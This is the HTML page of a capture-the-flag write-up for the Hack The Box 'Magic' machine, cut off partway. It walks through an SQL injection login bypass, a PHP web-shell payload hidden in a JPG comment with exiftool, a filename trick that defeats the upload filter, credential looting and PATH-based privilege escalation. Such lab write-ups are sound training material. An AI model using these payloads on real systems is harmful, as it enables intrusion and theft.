<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Write-up Magic Machine | PCW3R</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Write-up Magic Machine" /><meta name="author" content="pcw3r" /><meta property="og:locale" content="en_US" /><meta name="description" content="Ref°: HTB-14-Boot2Root — Magic is a medium level linux machine. It defined by sql injection to bypass the authentication of a login page and the exploitation of payload hidden in an image to gain our “foothold”. A lateral movement on the user theseus is possible through a leaked database and the presence in it of a password reused by this user. Privilege elevation is achieved by exploiting the sysinfo binary and environment variables. [1] Discovery - Figure out environment Network Service Scanning Nmap scan reveal 2 services on her usual port : ssh on port 22 web on port 80 1 $ nmap -A -T5 10.10.10.185 -p- Website We have portfolio website with possibility to see all pictures. And the capacity to upload files if we success to login. The login page is vulnerable to SQL Injection and we can bypass the authentication. How we know that ? Firstly, when we entered fake credential an error appear and present “Wrong Username or Password”. And when we entered only a single quote in to the “Username” field and submitted the request using the “Login” button, the error not appear. This show us the website interprets this single quote and had potentially vulnerable to SQL Injection. References - sql injection : https://portswigger.net/support/using-sql-injection-to-bypass-authentication [2] Foothold - Get into the target Bypassing Authentication with SQL Injection Now, we used &#39; or 1=1 -- This causes the application to perform the query: 1 SELECT * FROM users WHERE username = &#39;&#39; OR 1=1-- &#39; AND password = &#39;foo&#39; Because the comment sequence (–) causes the remainder of the query to be ignored, this is equivalent to: 1 SELECT * FROM users WHERE username = &#39; &#39; OR 1=1 And we got it! We able to upload images and gain foothold from this way. Obtaining Reverse Shell with Payload Injection The condition to upload allowed files are only JPG, JPEG and PNG extensions. We use exiftool to embed the payload into the picture to bypass this condition. 1 2 $ exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&quot;cmd&quot;]); _halt_compiler() ?&gt;&#39; minion.jpg $ mv minion.jpg minion.php.jpg We need to rename our file to *.php.jpg to bypass the restriction. Anyway the file is parsed as a PHP file and our payload is fully functional: Upload the file : Payload execution : Now we can use commands to control it with our web browser and leak for example passwd file. We know the system user to exploit : theseus But we must obtain reverse shell to perform lateral movement on this user. We use an other PHP payload we can find from : https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/ and proceed the same way. We listening the correct port and get reverse shell by www-data : We gain finally our foothold. [3] Lateral Movement - Move through environment Plaintext Password from database We have website, the first interesting enumeration we can be realize is on folder /var/www/*. Retrieve database information under db.php5 file : db name : Magic db host : localhost db username : theseus db password : iamkingtheseus I find php file to perform backup database on localhost such as for example : https://github.com/daniloaz/myphp-backup We retrieve the PHP file from Magic machine and execute to backup the database Magic. We don’t have the rights to retrieve the backup. To bypass this restriction, rename the backup file sql.gz to jpg file. Once we grab the file, we rename correctly and open the database. The database reveal new password Th3s3usW4sK1ng. Reusing Password Theseus account reuse the same password. Flag user [4] Privilege Escalation - Gain higher-level permissions Persistence with SSH Authorized Keys To proceed more easily, I make my ssh connection more persistent. Setuid, Path Modification and Reverse Shell with Payload Injection The enumeration reveal interesting binary /bin/sysinfo. The program run under root privilege but he can be launch by anybody from users group. Our account belongs to this group. This program launch many module like fdisk, cpuinfo or lshw. We using path variable to escalate our privilege by creating a named file of one of these modules with our bash reverse shell. We modify an environment variable in order to make one of the modules run using the following path : /tmp/privuser/ References - path environment : https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ We listening on our local machine and execute sysinfo program on Magic machine. Flag root Magic machine is compromised. Trophy Any sufficiently advanced technology is indistinguishable from magic. Arthur C. Clarke" /><meta property="og:description" content="Ref°: HTB-14-Boot2Root — Magic is a medium level linux machine. It defined by sql injection to bypass the authentication of a login page and the exploitation of payload hidden in an image to gain our “foothold”. A lateral movement on the user theseus is possible through a leaked database and the presence in it of a password reused by this user. Privilege elevation is achieved by exploiting the sysinfo binary and environment variables. [1] Discovery - Figure out environment Network Service Scanning Nmap scan reveal 2 services on her usual port : ssh on port 22 web on port 80 1 $ nmap -A -T5 10.10.10.185 -p- Website We have portfolio website with possibility to see all pictures. And the capacity to upload files if we success to login. The login page is vulnerable to SQL Injection and we can bypass the authentication. How we know that ? Firstly, when we entered fake credential an error appear and present “Wrong Username or Password”. And when we entered only a single quote in to the “Username” field and submitted the request using the “Login” button, the error not appear. This show us the website interprets this single quote and had potentially vulnerable to SQL Injection. References - sql injection : https://portswigger.net/support/using-sql-injection-to-bypass-authentication [2] Foothold - Get into the target Bypassing Authentication with SQL Injection Now, we used &#39; or 1=1 -- This causes the application to perform the query: 1 SELECT * FROM users WHERE username = &#39;&#39; OR 1=1-- &#39; AND password = &#39;foo&#39; Because the comment sequence (–) causes the remainder of the query to be ignored, this is equivalent to: 1 SELECT * FROM users WHERE username = &#39; &#39; OR 1=1 And we got it! We able to upload images and gain foothold from this way. Obtaining Reverse Shell with Payload Injection The condition to upload allowed files are only JPG, JPEG and PNG extensions. We use exiftool to embed the payload into the picture to bypass this condition. 1 2 $ exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&quot;cmd&quot;]); _halt_compiler() ?&gt;&#39; minion.jpg $ mv minion.jpg minion.php.jpg We need to rename our file to *.php.jpg to bypass the restriction. Anyway the file is parsed as a PHP file and our payload is fully functional: Upload the file : Payload execution : Now we can use commands to control it with our web browser and leak for example passwd file. We know the system user to exploit : theseus But we must obtain reverse shell to perform lateral movement on this user. We use an other PHP payload we can find from : https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/ and proceed the same way. We listening the correct port and get reverse shell by www-data : We gain finally our foothold. [3] Lateral Movement - Move through environment Plaintext Password from database We have website, the first interesting enumeration we can be realize is on folder /var/www/*. Retrieve database information under db.php5 file : db name : Magic db host : localhost db username : theseus db password : iamkingtheseus I find php file to perform backup database on localhost such as for example : https://github.com/daniloaz/myphp-backup We retrieve the PHP file from Magic machine and execute to backup the database Magic. We don’t have the rights to retrieve the backup. To bypass this restriction, rename the backup file sql.gz to jpg file. Once we grab the file, we rename correctly and open the database. The database reveal new password Th3s3usW4sK1ng. Reusing Password Theseus account reuse the same password. Flag user [4] Privilege Escalation - Gain higher-level permissions Persistence with SSH Authorized Keys To proceed more easily, I make my ssh connection more persistent. Setuid, Path Modification and Reverse Shell with Payload Injection The enumeration reveal interesting binary /bin/sysinfo. The program run under root privilege but he can be launch by anybody from users group. Our account belongs to this group. This program launch many module like fdisk, cpuinfo or lshw. We using path variable to escalate our privilege by creating a named file of one of these modules with our bash reverse shell. We modify an environment variable in order to make one of the modules run using the following path : /tmp/privuser/ References - path environment : https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ We listening on our local machine and execute sysinfo program on Magic machine. Flag root Magic machine is compromised. Trophy Any sufficiently advanced technology is indistinguishable from magic. Arthur C. Clarke" /><link rel="canonical" href="https://pcw3r.github.io/posts/HTB-14-Pentest-Magic/" /><meta property="og:url" content="https://pcw3r.github.io/posts/HTB-14-Pentest-Magic/" /><meta property="og:site_name" content="PCW3R" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-29T15:36:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Write-up Magic Machine" /><meta name="twitter:site" content="@PCW3R" /><meta name="twitter:creator" content="@pcw3r" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"headline":"Write-up Magic Machine","description":"Ref°: HTB-14-Boot2Root — Magic is a medium level linux machine. It defined by sql injection to bypass the authentication of a login page and the exploitation of payload hidden in an image to gain our “foothold”. A lateral movement on the user theseus is possible through a leaked database and the presence in it of a password reused by this user. Privilege elevation is achieved by exploiting the sysinfo binary and environment variables. [1] Discovery - Figure out environment Network Service Scanning Nmap scan reveal 2 services on her usual port : ssh on port 22 web on port 80 1 $ nmap -A -T5 10.10.10.185 -p- Website We have portfolio website with possibility to see all pictures. And the capacity to upload files if we success to login. The login page is vulnerable to SQL Injection and we can bypass the authentication. How we know that ? Firstly, when we entered fake credential an error appear and present “Wrong Username or Password”. And when we entered only a single quote in to the “Username” field and submitted the request using the “Login” button, the error not appear. This show us the website interprets this single quote and had potentially vulnerable to SQL Injection. References - sql injection : https://portswigger.net/support/using-sql-injection-to-bypass-authentication [2] Foothold - Get into the target Bypassing Authentication with SQL Injection Now, we used &#39; or 1=1 -- This causes the application to perform the query: 1 SELECT * FROM users WHERE username = &#39;&#39; OR 1=1-- &#39; AND password = &#39;foo&#39; Because the comment sequence (–) causes the remainder of the query to be ignored, this is equivalent to: 1 SELECT * FROM users WHERE username = &#39; &#39; OR 1=1 And we got it! We able to upload images and gain foothold from this way. Obtaining Reverse Shell with Payload Injection The condition to upload allowed files are only JPG, JPEG and PNG extensions. We use exiftool to embed the payload into the picture to bypass this condition. 1 2 $ exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&quot;cmd&quot;]); _halt_compiler() ?&gt;&#39; minion.jpg $ mv minion.jpg minion.php.jpg We need to rename our file to *.php.jpg to bypass the restriction. Anyway the file is parsed as a PHP file and our payload is fully functional: Upload the file : Payload execution : Now we can use commands to control it with our web browser and leak for example passwd file. We know the system user to exploit : theseus But we must obtain reverse shell to perform lateral movement on this user. We use an other PHP payload we can find from : https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/ and proceed the same way. We listening the correct port and get reverse shell by www-data : We gain finally our foothold. [3] Lateral Movement - Move through environment Plaintext Password from database We have website, the first interesting enumeration we can be realize is on folder /var/www/*. Retrieve database information under db.php5 file : db name : Magic db host : localhost db username : theseus db password : iamkingtheseus I find php file to perform backup database on localhost such as for example : https://github.com/daniloaz/myphp-backup We retrieve the PHP file from Magic machine and execute to backup the database Magic. We don’t have the rights to retrieve the backup. To bypass this restriction, rename the backup file sql.gz to jpg file. Once we grab the file, we rename correctly and open the database. The database reveal new password Th3s3usW4sK1ng. Reusing Password Theseus account reuse the same password. Flag user [4] Privilege Escalation - Gain higher-level permissions Persistence with SSH Authorized Keys To proceed more easily, I make my ssh connection more persistent. Setuid, Path Modification and Reverse Shell with Payload Injection The enumeration reveal interesting binary /bin/sysinfo. The program run under root privilege but he can be launch by anybody from users group. Our account belongs to this group. This program launch many module like fdisk, cpuinfo or lshw. We using path variable to escalate our privilege by creating a named file of one of these modules with our bash reverse shell. We modify an environment variable in order to make one of the modules run using the following path : /tmp/privuser/ References - path environment : https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ We listening on our local machine and execute sysinfo program on Magic machine. Flag root Magic machine is compromised. Trophy Any sufficiently advanced technology is indistinguishable from magic. Arthur C. Clarke","datePublished":"2020-08-29T15:36:00+02:00","dateModified":"2020-08-29T15:36:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://pcw3r.github.io/posts/HTB-14-Pentest-Magic/"},"url":"https://pcw3r.github.io/posts/HTB-14-Pentest-Magic/","author":{"@type":"Person","name":"pcw3r"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div class="profile-text mt-3"><div class="site-title"> <a href="/">PCW3R</a></div><div class="site-subtitle font-italic">Think outside the box.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/PCW3R" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/PCW3R" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['pcw3r','protonmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Write-up Magic Machine</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Write-up Magic Machine</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sat, Aug 29, 2020, 3:36 PM +0200"> {"long"=>"Aug 29, 2020", "short"=>"Aug 29"} <i class="unloaded">2020-08-29T15:36:00+02:00</i> </span> by <span class="author"> pcw3r </span></div></div><div class="post-tail-wrapper-head"> <i class="fas fa-hourglass-half fa-fw mr-1"></i> <span class="reading-time" title="Estimated read time"> 5 mins read </span></div><div class="post-content"><p><strong><center>Ref°: HTB-14-Boot2Root</center></strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Badge-Magic.png" alt="Desktop View" /></p><p>— Magic is a medium level linux machine. It defined by sql injection to bypass the authentication of a login page and the exploitation of payload hidden in an image to gain our “foothold”.</p><p>A lateral movement on the user theseus is possible through a leaked database and the presence in it of a password reused by this user.</p><p>Privilege elevation is achieved by exploiting the sysinfo binary and environment variables.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Information-Magic.png" alt="Desktop View" /></p><h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2><h3 id="network-service-scanning">Network Service Scanning</h3><hr /><p>Nmap scan reveal 2 services on her usual port :</p><ul><li><code class="language-plaintext highlighter-rouge">ssh</code> on port 22</li><li><code class="language-plaintext highlighter-rouge">web</code> on port 80</li></ul><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.185 <span class="nt">-p-</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-nmap.png" alt="Desktop View" /></p><h3 id="website">Website</h3><hr /><p>We have portfolio website with possibility to see all pictures.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-website.png" alt="Desktop View" /></p><p>And the capacity to <code class="language-plaintext highlighter-rouge">upload files</code> if we success to login.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-login_page.png" alt="Desktop View" /></p><p>The login page is vulnerable to SQL Injection and we can bypass the authentication.</p><p>How we know that ?</p><p>Firstly, when we entered fake credential an error appear and present “Wrong Username or Password”.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-error_login.png" alt="Desktop View" /></p><p>And when we entered only a single quote in to the “Username” field and submitted the request using the “Login” button, the error not appear.</p><p>This show us the website interprets this single quote and had potentially vulnerable to SQL Injection.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-injection_test.png" alt="Desktop View" /></p><p>References - sql injection : <a href="https://portswigger.net/support/using-sql-injection-to-bypass-authentication">https://portswigger.net/support/using-sql-injection-to-bypass-authentication</a></p><h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2><h3 id="bypassing-authentication-with-sql-injection">Bypassing Authentication with SQL Injection</h3><hr /><p>Now, we used <code class="language-plaintext highlighter-rouge">' or 1=1 -- </code></p><p>This causes the application to perform the query:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'foo'
</pre></table></code></div></div><p>Because the comment sequence (–) causes the remainder of the query to be ignored, this is equivalent to:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>SELECT * FROM users WHERE username = ' ' OR 1=1
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-injection_bypass.png" alt="Desktop View" /></p><p>And we got it! We able to upload images and gain foothold from this way.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-upload_page.png" alt="Desktop View" /></p><h3 id="obtaining-reverse-shell-with-payload-injection">Obtaining Reverse Shell with Payload Injection</h3><hr /><p>The condition to upload allowed files are only <code class="language-plaintext highlighter-rouge">JPG, JPEG and PNG</code> extensions.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-upload_condition.png" alt="Desktop View" /></p><p>We use <code class="language-plaintext highlighter-rouge">exiftool</code> to embed the payload into the picture to bypass this condition.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>exiftool <span class="nt">-Comment</span><span class="o">=</span><span class="s1">'&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); _halt_compiler() ?&gt;'</span> minion.jpg
<span class="gp">$</span><span class="w"> </span><span class="nb">mv </span>minion.jpg minion.php.jpg
</pre></table></code></div></div><p>We need to rename our file to <code class="language-plaintext highlighter-rouge">*.php.jpg</code> to bypass the restriction. Anyway the file is parsed as a PHP file and our payload is fully functional:</p><p>Upload the file :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-upload_test.png" alt="Desktop View" /></p><p>Payload execution :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-exec_payload.png" alt="Desktop View" /></p><p>Now we can use commands to control it with our web browser and leak for example <code class="language-plaintext highlighter-rouge">passwd</code> file.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-leak_passwd.png" alt="Desktop View" /></p><p>We know the system user to exploit : <code class="language-plaintext highlighter-rouge">theseus</code></p><p>But we must obtain reverse shell to perform lateral movement on this user.</p><p>We use an other PHP payload we can find from : <a href="https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/">https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/</a> and proceed the same way.</p><p>We listening the correct port and get reverse shell by <code class="language-plaintext highlighter-rouge">www-data</code> :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-nc_get_www-data.png" alt="Desktop View" /></p><p>We gain finally our foothold.</p><h2 id="3-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2><h3 id="plaintext-password-from-database">Plaintext Password from database</h3><hr /><p>We have website, the first interesting enumeration we can be realize is on folder <code class="language-plaintext highlighter-rouge">/var/www/*</code>.</p><p>Retrieve database information under <code class="language-plaintext highlighter-rouge">db.php5</code> file :</p><ul><li>db name : <code class="language-plaintext highlighter-rouge">Magic</code></li><li>db host : <code class="language-plaintext highlighter-rouge">localhost</code></li><li>db username : <code class="language-plaintext highlighter-rouge">theseus</code></li><li>db password : <code class="language-plaintext highlighter-rouge">iamkingtheseus</code></li></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-info_db.png" alt="Desktop View" /></p><p>I find php file to perform backup database on localhost such as for example : <a href="https://github.com/daniloaz/myphp-backup">https://github.com/daniloaz/myphp-backup</a></p><p>We retrieve the PHP file from Magic machine and execute to backup the database <code class="language-plaintext highlighter-rouge">Magic</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-transfert_backup_php.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-backup_db.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-enum.png" alt="Desktop View" /></p><p>We don’t have the rights to retrieve the backup.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-error_get_db.png" alt="Desktop View" /></p><p>To bypass this restriction, rename the backup file <code class="language-plaintext highlighter-rouge">sql.gz</code> to <code class="language-plaintext highlighter-rouge">jpg</code> file.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-mv_db1.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-grab_db.png" alt="Desktop View" /></p><p>Once we grab the file, we rename correctly and open the database.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-mv_db2.png" alt="Desktop View" /></p><p>The database reveal new password <code class="language-plaintext highlighter-rouge">Th3s3usW4sK1ng</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/magic/HTB-Images-Magic-db_check.png" alt="Desktop View" /></p><h3 id="reusing-password">Reusing Password</h3><hr /><p>Theseus account reuse the same password.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 